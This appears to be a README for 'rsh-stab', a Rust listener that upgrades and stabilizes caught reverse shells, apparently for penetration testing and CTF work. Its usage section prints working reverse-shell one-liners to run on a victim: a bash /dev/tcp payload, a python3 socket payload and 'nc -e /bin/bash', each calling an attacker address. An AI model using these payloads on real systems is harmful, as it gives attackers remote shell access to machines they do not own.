# rsh-stab

**Reverse shell stabilizer** — raw TTY relay, multi‑technique spray, automatic PTY
upgrade, and SIGWINCH forwarding.  Single Rust binary, zero runtime dependencies.

```bash
# install with one command
curl -sSL https://raw.githubusercontent.com/0xClumzzy/rsh-stab/master/install.sh | bash

# basic listener
rsh-stab 4444

# spray 10 techniques at once, catch the first that connects
rsh-stab --spray 10.10.14.5 4444

# auto‑send python3 PTY spawn on connect
rsh-stab --autoexec 4444

# connect to a bind shell
rsh-stab 10.10.14.5 4444
```

---

## Why

A standard `nc -lvnp 4444` reverse shell has no job control, no tab‑completion,
arrows send escape sequences instead of history navigation, and `Ctrl+C` kills the
whole session instead of the foreground command.  Fixing it manually requires the
annoying `python3 -c 'import pty…'` ⇢ `Ctrl+Z` ⇢ `stty raw -echo` ⇢ `fg` dance.

`rsh-stab` automates all of that in a single binary.

---

## Features

| Feature | What it does |
|---|---|
| **Raw‑mode relay** | Puts your terminal in raw mode automatically on connect — no `stty raw -echo; fg` needed. Restores it on disconnect (even if you `Ctrl+C`). |
| **Multi‑method spray** | Opens 10 ports, prints one‑liners for 10 different techniques (bash `/dev/tcp`, python3, python2, nc, perl, socat, php, ruby, lua). The first callback that lands closes the other 9 and enters the relay. |
| **Auto‑PTY** | After connection, sends 5 stabilization commands in sequence: `python3` PTY, `python` PTY, `script`, `script -q`, `export TERM`, `stty rows/cols`. Each command has a 300 ms gap — if one method isn't available, the next takes over. |
| **SIGWINCH** | Terminal resize is detected via a self‑pipe signal handler. A hint with the correct `stty rows N cols M` command is printed so you can paste it on the victim. |
| **Connect mode** | Works as a bind‑shell client too: `rsh-stab <host> <port>`. |
| **Single binary** | ~390 KB stripped, no runtime deps. Compiled with `libc` only. |

---

## Install

```bash
# one‑liner (prebuilt binary or falls back to cargo)
curl -sSL https://raw.githubusercontent.com/0xClumzzy/rsh-stab/master/install.sh | bash

# from source (requires Rust)
git clone https://github.com/0xClumzzy/rsh-stab.git
cd rsh-stab
cargo build --release
strip target/release/rsh-stab
cp target/release/rsh-stab /usr/local/bin/
```

---

## Usage

### Listen for a reverse shell

```bash
# attacker
rsh-stab 4444

# victim — any of these
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.14.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
nc -e /bin/bash 10.10.14.5 4444
```

The tool sets raw mode, then enters the relay.  After the victim connects, run
`python3 -c 'import pty;pty.spawn("/bin/bash")'` on the victim *if* you're not
using `--autoexec` or `--spray`.

### Spray — try everything

```bash
# attacker — opens ports 4444 … 4453
rsh-stab --spray 10.10.14.5 4444

# victim — paste one payload at a time from the printed list
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
python3 -c 'import socket…'
# … etc.
```

The first port that receives a connection wins.  The tool immediately closes all
other listeners and runs the 5‑step auto‑stabilization internally.

### Auto‑stabilize on connect

```bash
rsh-stab --autoexec 4444
```

After the victim connects, the tool sends the same 5‑step stabilization sequence
(spawn PTY, set TERM, set window size) *before* switching to interactive mode.

### Connect to a bind shell

```bash
rsh-stab 10.10.14.5 4444
```

---

## Architecture

```
                    poll()
                     │
     ┌───────────────┼───────────────┐
     │               │               │
 STDIN_FD       SOCKET_FD      SIGWINCH_PIPE
     │               │               │
 write(sock)   write(stdout)    TIOCGWINSZ + hint
```

- Single‑threaded `libc::poll()` event loop
- SIGWINCH delivered via self‑pipe trick (async‑signal‑safe)
- Raw mode entered with `cfmakeraw()` / `tcsetattr()`, original termios restored
  on `Drop`
- Spray mode uses a `Vec<pollfd>` over all listener sockets; first `POLLIN` wins

---

## Unstable / won't‑fix

- **No encryption** — use `socat OPENSSL‑LISTEN:443` if you need TLS
- **No keep‑alive** — one connection per launch (like `nc -lvnp`)
- **Binary data** — raw relay will echo control bytes to your terminal
- **`SIGKILL`** — kills without `Drop`, terminal stays raw; fix with `stty sane`
